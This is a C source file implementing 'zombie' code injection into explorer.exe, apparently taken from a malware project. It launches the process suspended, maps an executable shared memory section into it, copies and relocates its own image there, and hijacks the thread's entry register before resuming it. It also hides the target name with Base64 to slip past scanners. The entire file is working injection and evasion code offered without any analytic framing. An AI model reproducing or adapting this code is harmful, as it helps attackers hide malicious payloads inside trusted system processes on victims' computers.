#include <Windows.h>
#include "NTDLL.h"
#include "Injection.h"
#include "PE Tools.h"
#include "C Runtime.h"
#include "Base64.h"
#include "ZombieInjection.h"

NtCreateSection_ NtCreateSection;
NtMapViewOfSection_ NtMapViewOfSection;
NtUnmapViewOfSection_ NtUnmapViewOfSection;
NtClose_ NtClose;

BOOL InitializeZombieInjection()
{
	void* hModule = GetModuleBase32(L"ntdll.dll");

	NtCreateSection = (NtCreateSection_)GetProcAddress32(hModule, "NtCreateSection");
	if (!NtCreateSection)
	{
		return 0;
	}

	NtMapViewOfSection = (NtMapViewOfSection_)GetProcAddress32(hModule, "NtMapViewOfSection");
	if (!NtMapViewOfSection)
	{
		return 0;
	}

	NtUnmapViewOfSection = (NtUnmapViewOfSection_)GetProcAddress32(hModule, "NtUnmapViewOfSection");
	if (!NtUnmapViewOfSection)
	{
		return 0;
	}

	NtClose = (NtClose_)GetProcAddress32(hModule, "NtClose");
	if (!NtClose)
	{
		return 0;
	}

	return 1;
}

BOOL GetWow64ExplorerDirectory(wchar_t* Destination)
{
	wchar_t* EncodedExp = L"XABlAHgAcABsAG8AcgBlAHIALgBlAHgAZQA=";
	wchar_t DecodedExp[28];

	wchar_t szPath[MAX_PATH*2];
	DWORD dwLen = 0;

	RtlSecureZeroMemory(szPath,MAX_PATH*2);
	RtlSecureZeroMemory(DecodedExp,sizeof(DecodedExp));

	if (dwLen = GetSystemDirectoryW(szPath, MAX_PATH))
	{
		DWORD dwBase = 0;
		wchar_t* pPath = (wchar_t*)(szPath+dwLen);
		while (*--pPath != '\\');
		pPath+=4;
		pPath[0] = 'w';
		pPath[1] = 'o';
		pPath[2] = 'w';
		pPath[3] = '6';
		pPath[4] = '4';
		dwBase = FromBase64Crypto((const BYTE*)EncodedExp, wcslen(EncodedExp)*2,DecodedExp,sizeof(DecodedExp));
		if (dwBase)
		{
			m_memcpy(&pPath[5], DecodedExp, dwBase);
			m_memcpy(Destination,szPath,wcslen(szPath)*2);
		}
		return TRUE;
	}
	return FALSE;
}

BOOL GetExplorerDirectory(wchar_t* Destination)
{
	wchar_t* EncodedExp = L"XABlAHgAcABsAG8AcgBlAHIALgBlAHgAZQA=";
	wchar_t DecodedExp[28];
	wchar_t szPath[MAX_PATH*2];
	DWORD dwLen = 0;

	RtlSecureZeroMemory(szPath,MAX_PATH*2);
	RtlSecureZeroMemory(DecodedExp,sizeof(DecodedExp));

	if (dwLen = GetSystemDirectoryW(szPath, MAX_PATH))
	{
		DWORD dwBase = 0;
		wchar_t* pPath = (wchar_t*)(szPath+dwLen);
		while(*--pPath != '\\');
		*pPath = 0;
		dwBase = FromBase64Crypto((const BYTE*)EncodedExp, wcslen(EncodedExp)*2,DecodedExp,sizeof(DecodedExp));
		if (dwLen)
		{
			m_memcpy(pPath,DecodedExp,dwBase);
			m_memcpy(Destination,szPath, wcslen(szPath)*2);
			return TRUE;
		}
	}
	return FALSE;
}


BOOL GetExplorerDirectoryBasedOnArch(wchar_t* Destination)
{
	BOOL bArch = Is64(GetCurrentProcess());
	if (bArch)
	{
		if (GetWow64ExplorerDirectory(Destination))
		{
			return TRUE;
		}
	}
	else
	{
		if (GetExplorerDirectory(Destination))
		{
			return TRUE;
		}
	}
	return FALSE;
}


BOOL AllocatePool(DWORD Size, PZombiePool ZombieData, HANDLE hProc)
{
	BOOL Success = FALSE;
	LARGE_INTEGER SectionSize;
	NTSTATUS Status = 0;
	HANDLE hSection = 0;
	PVOID lpLocal = NULL, lpRemote = NULL;
	SIZE_T ViewSize = 0;
	RtlSecureZeroMemory(&SectionSize, sizeof(LARGE_INTEGER));
	SectionSize.LowPart = Size;

	do
	{
		Status = NtCreateSection(&hSection,SECTION_ALL_ACCESS,NULL,&SectionSize,PAGE_EXECUTE_READWRITE,SEC_COMMIT,NULL);
		if (!NT_SUCCESS(Status))
			break;

		Status = NtMapViewOfSection(hSection,GetCurrentProcess(),&lpLocal,0,0,0,&ViewSize,2,0,PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(Status))
			break;

		Status = NtMapViewOfSection(hSection,hProc,&lpRemote,0,0,0,&ViewSize,2,0,PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(Status))
			break;

		ZombieData->Local = lpLocal;
		ZombieData->Remote = lpRemote;


		Success = TRUE;
	}while(FALSE);


	if (hSection)
		NtClose(hSection);

	if(!Success && lpRemote)
	{
		NtUnmapViewOfSection(hProc,lpRemote);
	}

	if (!Success && lpRemote)
	{
		NtUnmapViewOfSection(GetCurrentProcess(),lpLocal);
	}

	return Success;
}

BOOL RemoveSection(HANDLE hProc, LPVOID Base)
{
	if (!NT_SUCCESS(NtUnmapViewOfSection(hProc, Base)))
		return 0;
	return 1;
}

DWORD InjectBase(LPTHREAD_START_ROUTINE lpFunction, PZombiePool ZombieData)
{
	DWORD dwAddress = 0;
	DWORD ImageBase = ((DWORD(*)())GetImageBase)();

	PIMAGE_DOS_HEADER pDOS = (PIMAGE_DOS_HEADER)ImageBase;
	PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)((DWORD)pDOS + pDOS->e_lfanew);
	
	if (pNT->Signature == IMAGE_NT_SIGNATURE)
	{
		DWORD RelRVA = 0;
		DWORD RelSize = 0;
		DWORD i = 0;

		m_memcpy(ZombieData->Local, (LPVOID)ImageBase,pNT->OptionalHeader.SizeOfImage);

		RelRVA = pNT->OptionalHeader.DataDirectory[5].VirtualAddress;
		RelSize = pNT->OptionalHeader.DataDirectory[5].Size;

		dwAddress = ((DWORD)lpFunction - ImageBase) + (DWORD)ZombieData->Remote;

		ProcessRelocations((PIMAGE_BASE_RELOCATION)((DWORD)ImageBase+ RelRVA), (DWORD)ZombieData->Local, (DWORD)ZombieData->Remote - (DWORD)ImageBase,  RelSize);
	}
	return dwAddress;
}


BOOL StartExplorer32Injection(wchar_t* szPath, LPTHREAD_START_ROUTINE lpFunction)
{
	BOOL Injected = FALSE;
	DWORD dwImageSize = 0;
	DWORD dwAddress = 0;

	ZombiePool ZombieData;

	STARTUPINFOW SI;
	PROCESS_INFORMATION PI;

	CONTEXT Context;


	RtlSecureZeroMemory(&Context,sizeof(CONTEXT));
	RtlSecureZeroMemory(&SI, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&PI, sizeof(PROCESS_INFORMATION));
	RtlSecureZeroMemory(&ZombieData, sizeof(ZombiePool));

	do
	{
		


		if (!CreateProcessW(NULL,szPath,0,0,FALSE,CREATE_SUSPENDED,0,0,&SI,&PI))
			break;
	

		

	

		Context.ContextFlags = CONTEXT_INTEGER;

		if (!GetThreadContext(PI.hThread,&Context))
			break;

	

		dwImageSize = GetModuleSize(((HMODULE(*)())GetImageBase)());
		if (!dwImageSize)
			break;

	

		if (!AllocatePool(dwImageSize,&ZombieData,PI.hProcess))
			break;



		dwAddress = InjectBase(lpFunction, &ZombieData);
		if (!dwAddress)
			break;
	     
		Context.Eax = dwAddress;

		if (!SetThreadContext(PI.hThread, &Context))
			break;

	
		if (!ResumeThread(PI.hThread))
			break;

		
	Injected = TRUE;

	

	}while(FALSE);


	if (!Injected && PI.hProcess)
		TerminateProcess(PI.hProcess,0);

	if (PI.hProcess)
		CloseHandle(PI.hProcess);

	if (PI.hThread)
		CloseHandle(PI.hThread);

	if (ZombieData.Local)
		NtUnmapViewOfSection(GetCurrentProcess(),ZombieData.Local);

	return Injected;
}